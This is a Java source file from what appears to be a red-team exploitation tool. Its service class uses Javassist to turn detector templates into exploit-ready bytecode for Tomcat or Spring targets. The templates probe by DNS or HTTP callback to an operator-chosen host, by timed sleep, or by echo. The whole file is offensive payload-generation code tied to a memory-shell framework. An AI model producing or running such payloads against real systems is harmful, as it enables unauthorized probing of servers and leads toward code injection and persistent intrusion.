package com.potato.potatotool.content.redTeam.payload.detector;

import com.potato.potatotool.content.redTeam.memshell.config.MemoryObj;
import com.potato.potatotool.content.redTeam.memshell.config.MemoryShellConstants;
import com.potato.potatotool.content.redTeam.memshell.util.ClassNameUtil;
import com.potato.potatotool.content.redTeam.memshell.util.ExpModifierUtil;
import com.potato.potatotool.content.redTeam.memshell.util.JavassistUtil;
import com.potato.potatotool.content.redTeam.payload.detector.templates.DFSEchoDetectorTemplate;
import com.potato.potatotool.content.redTeam.payload.detector.templates.DNSLogDetectorTemplate;
import com.potato.potatotool.content.redTeam.payload.detector.templates.HTTPLogDetectorTemplate;
import com.potato.potatotool.content.redTeam.payload.detector.templates.SleepDetectorTemplate;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import java.util.Locale;

public class DetectorPayloadService {
    private final ClassPool classPool = ClassPool.getDefault();

    public byte[] generate(DetectorPayloadRequest request) throws Exception {
        if (request == null) {
            throw new IllegalArgumentException("Detector request is null");
        }
        DetectorType type = request.getDetectorType();
        if (type == null) {
            throw new IllegalArgumentException("Detector type is null");
        }
        String className = ClassNameUtil.requireValidJavaClassName(request.getClassName(), "detector class name");
        classPool.insertClassPath(new ClassClassPath(DetectorPayloadService.class));
        CtClass ctClass = classPool.getCtClass(templateClassName(type));
        try {
            ctClass.getClassFile().setVersionToJava5();
            patchTemplate(ctClass, request);
            JavassistUtil.setClassNameIfNotNull(ctClass, className);
            JavassistUtil.removeSourceFileAttribute(ctClass);
            MemoryObj memoryObj = new MemoryObj();
            memoryObj.setGadgetType(null);
            return new ExpModifierUtil(memoryObj, ctClass).modifyClassForExploit();
        } finally {
            ctClass.detach();
        }
    }

    public static DetectorType parseType(String value) {
        if (value == null) {
            throw new IllegalArgumentException("Detector type is empty");
        }
        return DetectorType.valueOf(value.trim().toUpperCase(Locale.ROOT));
    }

    private void patchTemplate(CtClass ctClass, DetectorPayloadRequest request) throws Exception {
        switch (request.getDetectorType()) {
            case DNSLOG:
                String domain = requireText(request.getDnsDomain(), "DNSLog domain");
                CtMethod getDomain = ctClass.getDeclaredMethod("getDomain");
                getDomain.setBody(JavassistUtil.returnStringBody(domain));
                break;
            case HTTPLOG:
                String baseUrl = requireText(request.getHttpBaseUrl(), "HTTPLog URL");
                CtMethod getBaseURL = ctClass.getDeclaredMethod("getBaseURL");
                getBaseURL.setBody(JavassistUtil.returnStringBody(baseUrl));
                break;
            case SLEEP:
                int seconds = request.getSleepSeconds() <= 0 ? 5 : request.getSleepSeconds();
                CtMethod execSleep = ctClass.getDeclaredMethod("execSleep");
                execSleep.setBody("{try{java.lang.Thread.sleep(" + (seconds * 1000L) + "L);}catch (Exception ignored){}}");
                CtMethod getServerType = ctClass.getDeclaredMethod("getServerType");
                getServerType.setBody(JavassistUtil.returnStringBody(normalizeServerType(request.getServerType())));
                break;
            case DFSECHO:
            default:
                break;
        }
    }

    private static String templateClassName(DetectorType detectorType) {
        switch (detectorType) {
            case DFSECHO:
                return DFSEchoDetectorTemplate.class.getName();
            case DNSLOG:
                return DNSLogDetectorTemplate.class.getName();
            case HTTPLOG:
                return HTTPLogDetectorTemplate.class.getName();
            case SLEEP:
                return SleepDetectorTemplate.class.getName();
            default:
                throw new IllegalArgumentException("Unsupported detector type: " + detectorType);
        }
    }

    private static String requireText(String value, String label) {
        if (value == null || value.trim().isEmpty()) {
            throw new IllegalArgumentException(label + " is empty");
        }
        return value.trim();
    }

    private static String normalizeServerType(String serverType) {
        if (serverType == null || serverType.trim().isEmpty()) {
            return "tomcat";
        }
        String normalized = serverType.trim();
        if (MemoryShellConstants.SERVER_SPRING_MVC.equals(normalized)
                || MemoryShellConstants.SERVER_SPRING_WEBFLUX.equals(normalized)) {
            return "spring";
        }
        return normalized.toLowerCase(Locale.ROOT);
    }
}
